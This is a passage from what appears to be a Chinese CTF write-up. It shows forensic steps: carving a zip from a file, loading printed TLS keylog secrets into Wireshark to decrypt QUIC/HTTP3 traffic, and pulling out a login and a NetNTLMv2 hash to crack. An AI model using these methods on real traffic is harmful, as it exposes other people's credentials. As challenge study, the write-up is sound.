class="hljs-number">3</span>IDY<span class="hljs-number">2</span>IDM<span class="hljs-number">2</span>IDMxICAgMTEzYmNjODggNDY<span class="hljs-number">1</span>YTdmNjEKICAgIDAwMDAwNjlCICA<span class="hljs-number">2</span>MiA<span class="hljs-number">2</span>MSA<span class="hljs-number">2</span>NCA<span class="hljs-number">2</span>MiAzNSA<span class="hljs-number">2</span>NiA<span class="hljs-number">2</span>NCAzOCAgMzcgMzEgMzcgMzcgNjMgNjEgMzUgMzEgICBiYWRiNWZkOCA<span class="hljs-number">3</span>MTc<span class="hljs-number">3</span>Y<span class="hljs-number">2E1</span>MQogICAgMDAwMDA<span class="hljs-number">2</span>QUIgIDYzIDMyIDM<span class="hljs-number">0</span>IDYzIDY<span class="hljs-number">1</span>IDYxIDYyIDM<span class="hljs-number">5</span>ICAzNCAzNCA<span class="hljs-number">2</span>MiAzMyAzNCA<span class="hljs-number">2</span>MSAyMCAzOCAgIGMyNGNlYWI<span class="hljs-number">5</span>IDQ<span class="hljs-number">0</span>YjM<span class="hljs-number">0</span>YSA<span class="hljs-number">4</span>CiAgICAwMDAwMDZCQiAgMzIgNjUgNjMgMzMgNjUgNjIgNjYgMzMgIDMxIDMzIDMxIDYyIDMyIDM<span class="hljs-number">0</span>IDM<span class="hljs-number">0</span>IDMyICAgMmVjM<span class="hljs-number">2</span>ViZjMgMTMxYjI<span class="hljs-number">0</span>NDIKICAgIDAwMDAwNkNCICA<span class="hljs-number">2</span>NCAzMSAzNiAzNSA<span class="hljs-number">2</span>MiA<span class="hljs-number">2</span>MiAzMCAzMCAgNjQgNjQgMzYgNjIgMzggNjQgMzEgNjEgICBkMTY<span class="hljs-number">1</span>YmIwMCBkZDZiOGQxYQogICAgMDAwMDA<span class="hljs-number">2</span>REIgIDM<span class="hljs-number">2</span>IDYyIDM<span class="hljs-number">0</span>IDYzIDM<span class="hljs-number">4</span>IDM<span class="hljs-number">2</span>IDM<span class="hljs-number">2</span>IDY<span class="hljs-number">0</span>ICA<span class="hljs-number">2</span>MSA<span class="hljs-number">2</span>NiAzMyA<span class="hljs-number">2</span>NiA<span class="hljs-number">2</span>NCAzMyAzNyAzMyAgIDZiNGM<span class="hljs-number">4</span>NjZkIGFmM<span class="hljs-number">2</span>ZkMzczCiAgICAwMDAwMDZFQiAgNjMgMzIgMzIgNjQgMzMgMzMgMzggMzggIDM<span class="hljs-number">2</span>IDMyIDM<span class="hljs-number">5</span>IDMwIDY<span class="hljs-number">1</span>IDY<span class="hljs-number">0</span>IDMyIDM<span class="hljs-number">4</span>ICAgYzIyZDMzODggNjI<span class="hljs-number">5</span>MGVkMjgKICAgIDAwMDAwNkZCICAzNiAzOCA<span class="hljs-number">2</span>MSAzNyAzMyAzOSAzNSA<span class="hljs-number">2</span>NSAgMzYgMzkgMzEgMzkgMzggMzAgNjIgMzkgICA<span class="hljs-number">2</span>OGE<span class="hljs-number">3</span>Mzk<span class="hljs-number">1</span>ZSA<span class="hljs-number">2</span>OTE<span class="hljs-number">5</span>ODBiOQogICAgMDAwMDA<span class="hljs-number">3</span>MEIgIDM<span class="hljs-number">5</span>IDMwIDY<span class="hljs-number">0</span>IDY<span class="hljs-number">1</span>IDM<span class="hljs-number">0</span>IDM<span class="hljs-number">2</span>IDYyIDM<span class="hljs-number">3</span>ICAzNiA<span class="hljs-number">2</span>MSAzNSAzNCA<span class="hljs-number">2</span>NiAzOSA<span class="hljs-number">2</span>NSAwYSAgIDkwZGU<span class="hljs-number">0</span>NmI<span class="hljs-number">3</span>IDZhNTRmOWUuCiAgICAwMDAwMDcxQiAgNDMgNGMgNDkgNDUgNGUgNTQgNWYgNDggIDQxIDRlIDQ<span class="hljs-number">0</span>IDUzIDQ<span class="hljs-number">4</span>IDQxIDRiIDQ<span class="hljs-number">1</span>ICAgQ<span class="hljs-number">0</span>xJRU<span class="hljs-number">5</span>UX<span class="hljs-number">0</span>ggQU<span class="hljs-number">5</span>EU<span class="hljs-number">0</span>hBS<span class="hljs-number">0</span>UKICAgIDAwMDAwNzJCICA<span class="hljs-number">1</span>ZiA<span class="hljs-number">1</span>NCA<span class="hljs-number">1</span>MiA<span class="hljs-number">0</span>MSA<span class="hljs-number">0</span>NiA<span class="hljs-number">0</span>NiA<span class="hljs-number">0</span>OSA<span class="hljs-number">0</span>MyAgNWYgNTMgNDUgNDMgNTIgNDUgNTQgMjAgICBfVFJBRkZJQyBfU<span class="hljs-number">0</span>VDUkVUIAogICAgMDAwMDA<span class="hljs-number">3</span>M<span class="hljs-number">0</span>IgIDY<span class="hljs-number">1</span>IDM<span class="hljs-number">4</span>IDY<span class="hljs-number">1</span>IDY<span class="hljs-number">2</span>IDM<span class="hljs-number">3</span>IDMzIDYyIDM<span class="hljs-number">5</span>ICAzMSA<span class="hljs-number">2</span>MiAzNCA<span class="hljs-number">2</span>MyAzOSA<span class="hljs-number">2</span>NCAzNiA<span class="hljs-number">2</span>NSAgIGU<span class="hljs-number">4</span>ZWY<span class="hljs-number">3</span>M<span class="hljs-number">2</span>I<span class="hljs-number">5</span>IDFiNGM<span class="hljs-number">5</span>ZDZlCiAgICAwMDAwMDc<span class="hljs-number">0</span>QiAgMzMgMzcgMzEgMzEgMzMgNjIgNjMgNjMgIDM<span class="hljs-number">4</span>IDM<span class="hljs-number">4</span>IDM<span class="hljs-number">0</span>IDM<span class="hljs-number">2</span>IDM<span class="hljs-number">1</span>IDYxIDM<span class="hljs-number">3</span>IDY<span class="hljs-number">2</span>ICAgMzcxMTNiY<span class="hljs-number">2</span>MgODg<span class="hljs-number">0</span>NjVhN<span class="hljs-number">2</span>YKICAgIDAwMDAwNzVCICAzNiAzMSA<span class="hljs-number">2</span>MiA<span class="hljs-number">2</span>MSA<span class="hljs-number">2</span>NCA<span class="hljs-number">2</span>MiAzNSA<span class="hljs-number">2</span>NiAgNjQgMzggMzcgMzEgMzcgMzcgNjMgNjEgICA<span class="hljs-number">2</span>MWJhZGI<span class="hljs-number">1</span>ZiBkODcxNzdjYQogICAgMDAwMDA<span class="hljs-number">3</span>NkIgIDM<span class="hljs-number">1</span>IDMxIDYzIDMyIDM<span class="hljs-number">0</span>IDYzIDY<span class="hljs-number">1</span>IDYxICA<span class="hljs-number">2</span>MiAzOSAzNCAzNCA<span class="hljs-number">2</span>MiAzMyAzNCA<span class="hljs-number">2</span>MSAgIDUxYzI<span class="hljs-number">0</span>Y<span class="hljs-number">2</span>VhIGI<span class="hljs-number">5</span>NDRiMzRhCiAgICAwMDAwMDc<span class="hljs-number">3</span>QiAgMjAgMzEgMzAgMzkgMzYgMzUgNjQgNjYgIDM<span class="hljs-number">0</span>IDMyIDM<span class="hljs-number">2</span>IDMyIDM<span class="hljs-number">1</span>IDM<span class="hljs-number">3</span>IDYxIDMyICAgIDEwOTY<span class="hljs-number">1</span>ZGYgNDI<span class="hljs-number">2</span>MjU<span class="hljs-number">3</span>YTIKICAgIDAwMDAwNzhCICAzOCAzNSA<span class="hljs-number">2</span>MyAzNiA<span class="hljs-number">2</span>NSAzOCAzMSAzMiAgNjUgNjQgMzUgMzQgMzQgMzYgMzggNjMgICA<span class="hljs-number">4</span>NWM<span class="hljs-number">2</span>ZTgxMiBlZDU<span class="hljs-number">0</span>NDY<span class="hljs-number">4</span>YwogICAgMDAwMDA<span class="hljs-number">3</span>OUIgIDM<span class="hljs-number">1</span>IDM<span class="hljs-number">5</span>IDM<span class="hljs-number">0</span>IDMzIDM<span class="hljs-number">3</span>IDY<span class="hljs-number">1</span>IDM<span class="hljs-number">3</span>IDM<span class="hljs-number">3</span>ICA<span class="hljs-number">2</span>MiA<span class="hljs-number">2</span>MyA<span class="hljs-number">2</span>NSA<span class="hljs-number">2</span>NiA<span class="hljs-number">2</span>NiAzMiA<span class="hljs-number">2</span>MyAzMyAgIDU<span class="hljs-number">5</span>NDM<span class="hljs-number">3</span>ZTc<span class="hljs-number">3</span>IGJjZWZmMmMzCiAgICAwMDAwMDdBQiAgNjEgMzYgNjQgMzYgMzMgMzMgNjQgNjEgIDYzIDY<span class="hljs-number">1</span>IDY<span class="hljs-number">2</span>IDYxIDY<span class="hljs-number">0</span>IDY<span class="hljs-number">2</span>IDM<span class="hljs-number">4</span>IDMxICAgYTZkNjMzZGEgY<span class="hljs-number">2</span>VmYWRmODEKICAgIDAwMDAwN<span class="hljs-number">0</span>JCICAzOCAzOCA<span class="hljs-number">2</span>NSAzOSAzNyA<span class="hljs-number">2</span>MyAzNCAzOSAgMzMgMzUgNjQgNjYgMzYgMzggMzEgMzUgICA<span class="hljs-number">4</span>OGU<span class="hljs-number">5</span>N<span class="hljs-number">2</span>M<span class="hljs-number">0</span>OSAzNWRmNjgxNQogICAgMDAwMDA<span class="hljs-number">3</span>Q<span class="hljs-number">0</span>IgIDY<span class="hljs-number">1</span>IDM<span class="hljs-number">1</span>IDMzIDM<span class="hljs-number">5</span>IDM<span class="hljs-number">4</span>IDYyIDMyIDM<span class="hljs-number">0</span>ICAzMiAzNyAzMyA<span class="hljs-number">2</span>MSA<span class="hljs-number">2</span>NCA<span class="hljs-number">2</span>NCA<span class="hljs-number">2</span>MyAzNyAgIGU<span class="hljs-number">1</span>Mzk<span class="hljs-number">4</span>YjI<span class="hljs-number">0</span>IDI<span class="hljs-number">3</span>M<span class="hljs-number">2</span>FkZGM<span class="hljs-number">3</span>CiAgICAwMDAwMDdEQiAgMzkgMGEgNTMgNDUgNTIgNTYgNDUgNTIgIDVmIDU<span class="hljs-number">0</span>IDUyIDQxIDQ<span class="hljs-number">2</span>IDQ<span class="hljs-number">2</span>IDQ<span class="hljs-number">5</span>IDQzICAgOS<span class="hljs-number">5</span>TRVJWRVIgX<span class="hljs-number">1</span>RSQUZGSUMKICAgIDAwMDAwN<span class="hljs-number">0</span>VCICA<span class="hljs-number">1</span>ZiA<span class="hljs-number">1</span>MyA<span class="hljs-number">0</span>NSA<span class="hljs-number">0</span>MyA<span class="hljs-number">1</span>MiA<span class="hljs-number">0</span>NSA<span class="hljs-number">1</span>NCA<span class="hljs-number">1</span>ZiAgMzAgMjAgNjUgMzggNjUgNjYgMzcgMzMgICBfU<span class="hljs-number">0</span>VDUkVUXyAwIGU<span class="hljs-number">4</span>ZWY<span class="hljs-number">3</span>MwogICAgMDAwMDA<span class="hljs-number">3</span>RkIgIDYyIDM<span class="hljs-number">5</span>IDMxIDYyIDM<span class="hljs-number">0</span>IDYzIDM<span class="hljs-number">5</span>IDY<span class="hljs-number">0</span>ICAzNiA<span class="hljs-number">2</span>NSAzMyAzNyAzMSAzMSAzMyA<span class="hljs-number">2</span>MiAgIGI<span class="hljs-number">5</span>MWI<span class="hljs-number">0</span>YzlkIDZlMzcxMTNiCiAgICAwMDAwMDgwQiAgNjMgNjMgMzggMzggMzQgMzYgMzUgNjEgIDM<span class="hljs-number">3</span>IDY<span class="hljs-number">2</span>IDM<span class="hljs-number">2</span>IDMxIDYyIDYxIDY<span class="hljs-number">0</span>IDYyICAgY<span class="hljs-number">2</span>M<span class="hljs-number">4</span>ODQ<span class="hljs-number">2</span>NWEgN<span class="hljs-number">2</span>Y<span class="hljs-number">2</span>MWJhZGIKICAgIDAwMDAwODFCICAzNSA<span class="hljs-number">2</span>NiA<span class="hljs-number">2</span>NCAzOCAzNyAzMSAzNyAzNyAgNjMgNjEgMzUgMzEgNjMgMzIgMzQgNjMgICA<span class="hljs-number">1</span>ZmQ<span class="hljs-number">4</span>NzE<span class="hljs-number">3</span>NyBjYTUxYzI<span class="hljs-number">0</span>YwogICAgMDAwMDA<span class="hljs-number">4</span>MkIgIDY<span class="hljs-number">1</span>IDYxIDYyIDM<span class="hljs-number">5</span>IDM<span class="hljs-number">0</span>IDM<span class="hljs-number">0</span>IDYyIDMzICAzNCA<span class="hljs-number">2</span>MSAyMCA<span class="hljs-number">2</span>MyA<span class="hljs-number">2</span>NCA<span class="hljs-number">2</span>MiA<span class="hljs-number">2</span>NiAzNyAgIGVhYjk<span class="hljs-number">0</span>NGIzIDRhIGNkYmY<span class="hljs-number">3</span>CiAgICAwMDAwMDgzQiAgNjMgMzcgNjEgMzEgMzYgMzEgNjEgNjYgIDM<span class="hljs-number">3</span>IDYxIDYxIDM<span class="hljs-number">4</span>IDMyIDM<span class="hljs-number">5</span>IDYyIDMxICAgYzdhMTYxYWYgN<span class="hljs-number">2</span>FhODI<span class="hljs-number">5</span>YjEKICAgIDAwMDAwODRCICAzNCA<span class="hljs-number">2</span>MiA<span class="hljs-number">2</span>NSA<span class="hljs-number">2</span>MyA<span class="hljs-number">2</span>MSA<span class="hljs-number">2</span>MSAzMiA<span class="hljs-number">2</span>MyAgMzAgMzAgMzAgNjIgMzggMzEgMzggMzMgICA<span class="hljs-number">0</span>YmVjYWEyYyAwMDBiODE<span class="hljs-number">4</span>MwogICAgMDAwMDA<span class="hljs-number">4</span>NUIgIDMwIDMwIDMwIDM<span class="hljs-number">5</span>IDM<span class="hljs-number">4</span>IDMzIDY<span class="hljs-number">1</span>IDMwICAzNiAzNSAzOCAzOSA<span class="hljs-number">2</span>NiA<span class="hljs-number">2</span>NSA<span class="hljs-number">2</span>NiAzMCAgIDAwMDk<span class="hljs-number">4</span>M<span class="hljs-number">2</span>UwIDY<span class="hljs-number">1</span>ODlmZWYwCiAgICAwMDAwMDg<span class="hljs-number">2</span>QiAgNjMgMzUgMzAgNjUgMzkgMzQgMzYgMzIgIDYzIDY<span class="hljs-number">2</span>IDM<span class="hljs-number">3</span>IDMxIDYxIDY<span class="hljs-number">1</span>IDYyIDM<span class="hljs-number">0</span>ICAgYzUwZTk<span class="hljs-number">0</span>NjIgY<span class="hljs-number">2</span>Y<span class="hljs-number">3</span>MWFlYjQKICAgIDAwMDAwODdCICAzOCAzNyA<span class="hljs-number">2</span>NSAzMSA<span class="hljs-number">2</span>MyA<span class="hljs-number">2</span>MiAzMSA<span class="hljs-number">2</span>NCAgNjUgNjYgNjEgNjUgNjYgMzAgMzYgNjEgICA<span class="hljs-number">4</span>N<span class="hljs-number">2</span>UxY<span class="hljs-number">2</span>IxZCBlZmFlZjA<span class="hljs-number">2</span>YQogICAgMDAwMDA<span class="hljs-number">4</span>OEIgIDM<span class="hljs-number">5</span>IDM<span class="hljs-number">0</span>IDMxIDMyIDMzIDM<span class="hljs-number">0</span>IDY<span class="hljs-number">1</span>IDYxICAzNyA<span class="hljs-number">2</span>MSAzMiAwYSA<span class="hljs-number">0</span>MyA<span class="hljs-number">0</span>YyA<span class="hljs-number">0</span>OSA<span class="hljs-number">0</span>NSAgIDk<span class="hljs-number">0</span>MTIzNGVhIDdhMi<span class="hljs-number">5</span>DTElFCiAgICAwMDAwMDg<span class="hljs-number">5</span>QiAgNGUgNTQgNWYgNTQgNTIgNDEgNDYgNDYgIDQ<span class="hljs-number">5</span>IDQzIDVmIDUzIDQ<span class="hljs-number">1</span>IDQzIDUyIDQ<span class="hljs-number">1</span>ICAgTlRfVFJBRkYgSUNfU<span class="hljs-number">0</span>VDUkUKICAgIDAwMDAwOEFCICA<span class="hljs-number">1</span>NCA<span class="hljs-number">1</span>ZiAzMCAyMCA<span class="hljs-number">2</span>NSAzOCA<span class="hljs-number">2</span>NSA<span class="hljs-number">2</span>NiAgMzcgMzMgNjIgMzkgMzEgNjIgMzQgNjMgICBUXzAgZThlZiA<span class="hljs-number">3</span>M<span class="hljs-number">2</span>I<span class="hljs-number">5</span>MWI<span class="hljs-number">0</span>YwogICAgMDAwMDA<span class="hljs-number">4</span>QkIgIDM<span class="hljs-number">5</span>IDY<span class="hljs-number">0</span>IDM<span class="hljs-number">2</span>IDY<span class="hljs-number">1</span>IDMzIDM<span class="hljs-number">3</span>IDMxIDMxICAzMyA<span class="hljs-number">2</span>MiA<span class="hljs-number">2</span>MyA<span class="hljs-number">2</span>MyAzOCAzOCAzNCAzNiAgIDlkNmUzNzExIDNiY<span class="hljs-number">2</span>M<span class="hljs-number">4</span>ODQ<span class="hljs-number">2</span>CiAgICAwMDAwMDhDQiAgMzUgNjEgMzcgNjYgMzYgMzEgNjIgNjEgIDY<span class="hljs-number">0</span>IDYyIDM<span class="hljs-number">1</span>IDY<span class="hljs-number">2</span>IDY<span class="hljs-number">0</span>IDM<span class="hljs-number">4</span>IDM<span class="hljs-number">3</span>IDMxICAgNWE<span class="hljs-number">3</span>ZjYxYmEgZGI<span class="hljs-number">1</span>ZmQ<span class="hljs-number">4</span>NzEKICAgIDAwMDAwOERCICAzNyAzNyA<span class="hljs-number">2</span>MyA<span class="hljs-number">2</span>MSAzNSAzMSA<span class="hljs-number">2</span>MyAzMiAgMzQgNjMgNjUgNjEgNjIgMzkgMzQgMzQgICA<span class="hljs-number">3</span>N<span class="hljs-number">2</span>NhNTFjMiA<span class="hljs-number">0</span>Y<span class="hljs-number">2</span>VhYjk<span class="hljs-number">0</span>NAogICAgMDAwMDA<span class="hljs-number">4</span>RUIgIDYyIDMzIDM<span class="hljs-number">0</span>IDYxIDIwIDY<span class="hljs-number">1</span>IDM<span class="hljs-number">1</span>IDM<span class="hljs-number">4</span>ICA<span class="hljs-number">2</span>NSAzNCAzMCAzOCAzOCA<span class="hljs-number">2</span>MSAzNyAzOCAgIGIzNGEgZTU<span class="hljs-number">4</span>IGU<span class="hljs-number">0</span>MDg<span class="hljs-number">4</span>YTc<span class="hljs-number">4</span>CiAgICAwMDAwMDhGQiAgMzQgMzAgNjQgMzMgMzkgMzkgMzEgNjEgIDYzIDMyIDMzIDMzIDM<span class="hljs-number">2</span>IDYzIDM<span class="hljs-number">1</span>IDM<span class="hljs-number">4</span>ICAgNDBkMzk<span class="hljs-number">5</span>MWEgYzIzMzZjNTgKICAgIDAwMDAwOTBCICAzMSA<span class="hljs-number">2</span>NCAzMiA<span class="hljs-number">2</span>MSAzMyAzNSA<span class="hljs-number">2</span>NSA<span class="hljs-number">2</span>NCAgNjIgNjUgNjIgNjYgNjQgMzEgMzQgMzQgICAxZDJhMzVlZCBiZWJmZDE<span class="hljs-number">0</span>NAogICAgMDAwMDA<span class="hljs-number">5</span>MUIgIDMyIDMwIDYxIDMyIDM<span class="hljs-number">5</span>IDYzIDMyIDM<span class="hljs-number">4</span>ICAzNyAzNCAzNCAzNCA<span class="hljs-number">2</span>MyAzMyAzNiAzMyAgIDIwYTI<span class="hljs-number">5</span>YzI<span class="hljs-number">4</span>IDc<span class="hljs-number">0</span>NDRjMzYzCiAgICAwMDAwMDkyQiAgMzEgNjQgNjMgMzkgMzggMzAgMzMgMzggIDYyIDM<span class="hljs-number">3</span>IDMxIDY<span class="hljs-number">2</span>IDMxIDY<span class="hljs-number">0</span>IDMxIDM<span class="hljs-number">1</span>ICAgMWRjOTgwMzggYjcxZjFkMTUKICAgIDAwMDAwOTNCICAzMyA<span class="hljs-number">2</span>MyA<span class="hljs-number">2</span>NCAzMyAzNyA<span class="hljs-number">2</span>MiA<span class="hljs-number">2</span>MSAzNCAgMzYgMzEgMzYgMzQgMzEgMzQgMzUgNjEgICAzY<span class="hljs-number">2</span>QzN<span class="hljs-number">2</span>JhNCA<span class="hljs-number">2</span>MTY<span class="hljs-number">0</span>MTQ<span class="hljs-number">1</span>YQogICAgMDAwMDA<span class="hljs-number">5</span>NEIgIDMwIDMyIDM<span class="hljs-number">4</span>IDY<span class="hljs-number">2</span>IDY<span class="hljs-number">0</span>IDBhICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAyOGZkLgo<br></code></pre></td></tr></table></figure><p>foremost分出来一个flag.txt的压缩包，有密码<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714478184971-175ffeb0-3fab-4676-a5d3-9257832ee931.png" alt="image.png"><br>搜一下这个发现这是tls密钥</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">SERVER_HANDSHAKE_TRAFFIC_SECRET e<span class="hljs-number">8</span>ef<span class="hljs-number">73</span>b<span class="hljs-number">91</span>b<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">6e37113</span>bcc<span class="hljs-number">88465</span>a<span class="hljs-number">7</span>f<span class="hljs-number">61</span>badb<span class="hljs-number">5</span>fd<span class="hljs-number">87177</span>ca<span class="hljs-number">51</span><span class="hljs-keyword">c</span><span class="hljs-number">24</span>ceab<span class="hljs-number">944</span>b<span class="hljs-number">34</span>a <span class="hljs-number">82</span>ec<span class="hljs-number">3</span>ebf<span class="hljs-number">3131</span>b<span class="hljs-number">2442</span>d<span class="hljs-number">165</span>bb<span class="hljs-number">00</span>dd<span class="hljs-number">6</span>b<span class="hljs-number">8</span>d<span class="hljs-number">1</span>a<span class="hljs-number">6</span>b<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">866</span>daf<span class="hljs-number">3</span>fd<span class="hljs-number">373</span><span class="hljs-keyword">c</span><span class="hljs-number">22</span>d<span class="hljs-number">33886290</span>ed<span class="hljs-number">2868</span>a<span class="hljs-number">7395e691980</span>b<span class="hljs-number">990</span>de<span class="hljs-number">46</span>b<span class="hljs-number">76</span>a<span class="hljs-number">54</span>f<span class="hljs-number">9</span>e<br>CLIENT_HANDSHAKE_TRAFFIC_SECRET e<span class="hljs-number">8</span>ef<span class="hljs-number">73</span>b<span class="hljs-number">91</span>b<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">6e37113</span>bcc<span class="hljs-number">88465</span>a<span class="hljs-number">7</span>f<span class="hljs-number">61</span>badb<span class="hljs-number">5</span>fd<span class="hljs-number">87177</span>ca<span class="hljs-number">51</span><span class="hljs-keyword">c</span><span class="hljs-number">24</span>ceab<span class="hljs-number">944</span>b<span class="hljs-number">34</span>a <span class="hljs-number">10965</span>df<span class="hljs-number">426257</span>a<span class="hljs-number">285</span><span class="hljs-keyword">c</span><span class="hljs-number">6e812</span>ed<span class="hljs-number">54468</span><span class="hljs-keyword">c</span><span class="hljs-number">59437e77</span>bceff<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>a<span class="hljs-number">6</span>d<span class="hljs-number">633</span>dacefadf<span class="hljs-number">8188e97</span><span class="hljs-keyword">c</span><span class="hljs-number">4935</span>df<span class="hljs-number">6815e5398</span>b<span class="hljs-number">24273</span>addc<span class="hljs-number">79</span><br>SERVER_TRAFFIC_SECRET_<span class="hljs-number">0</span> e<span class="hljs-number">8</span>ef<span class="hljs-number">73</span>b<span class="hljs-number">91</span>b<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">6e37113</span>bcc<span class="hljs-number">88465</span>a<span class="hljs-number">7</span>f<span class="hljs-number">61</span>badb<span class="hljs-number">5</span>fd<span class="hljs-number">87177</span>ca<span class="hljs-number">51</span><span class="hljs-keyword">c</span><span class="hljs-number">24</span>ceab<span class="hljs-number">944</span>b<span class="hljs-number">34</span>a cdbf<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>a<span class="hljs-number">161</span>af<span class="hljs-number">7</span>aa<span class="hljs-number">829</span>b<span class="hljs-number">14</span>becaa<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">000</span>b<span class="hljs-number">8183000983e06589</span>fef<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">50e9462</span>cf<span class="hljs-number">71</span>aeb<span class="hljs-number">487e1</span>cb<span class="hljs-number">1</span>defaef<span class="hljs-number">06</span>a<span class="hljs-number">941234</span>ea<span class="hljs-number">7</span>a<span class="hljs-number">2</span><br>CLIENT_TRAFFIC_SECRET_<span class="hljs-number">0</span> e<span class="hljs-number">8</span>ef<span class="hljs-number">73</span>b<span class="hljs-number">91</span>b<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">6e37113</span>bcc<span class="hljs-number">88465</span>a<span class="hljs-number">7</span>f<span class="hljs-number">61</span>badb<span class="hljs-number">5</span>fd<span class="hljs-number">87177</span>ca<span class="hljs-number">51</span><span class="hljs-keyword">c</span><span class="hljs-number">24</span>ceab<span class="hljs-number">944</span>b<span class="hljs-number">34</span>a e<span class="hljs-number">58e4088</span>a<span class="hljs-number">7840</span>d<span class="hljs-number">3991</span>ac<span class="hljs-number">2336</span><span class="hljs-keyword">c</span><span class="hljs-number">581</span>d<span class="hljs-number">2</span>a<span class="hljs-number">35</span>edbebfd<span class="hljs-number">14420</span>a<span class="hljs-number">29</span><span class="hljs-keyword">c</span><span class="hljs-number">287444</span><span class="hljs-keyword">c</span><span class="hljs-number">3631</span>dc<span class="hljs-number">98038</span>b<span class="hljs-number">71</span>f<span class="hljs-number">1</span>d<span class="hljs-number">153</span>cd<span class="hljs-number">37</span>ba<span class="hljs-number">46164145</span>a<span class="hljs-number">028</span>fd<br></code></pre></td></tr></table></figure><p>保存为<code>tls.keylog</code><br>在wireshark的编辑-&gt;首选项-&gt;protocols-&gt;tls<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714478904994-4cdb7db3-ba0d-4023-a825-95e717cb2460.png" alt="image.png"><br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714479048201-40dddac8-1ee5-4ad5-8cdc-232975c006e0.png" alt="image.png"><br>然后就会出现http3的流<br>追踪quic<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714479100231-206ef29c-8fd5-4b8d-b3c1-82d18e6447e2.png" alt="image.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html">.#....P........L.._P...........T.42..*username=admin&amp;password=QUICAUTH-CCC123!@#.&#x27;.....P........L.Q.a.AW&quot;._P................_M...........V..a...*h....e@..!......T......C.<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>quic-AUTH<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/style.css&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Secret<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>      Congratulations, you loaded this page using HTTP/3!<br>      Your files have been encrypted and saved,Enjoy it!<br>      Pass is :<br>      admin::SecretServer:d158262017948de9:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>根据<a href="https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash">https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash</a><br>netmtlmv2解密<br>构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 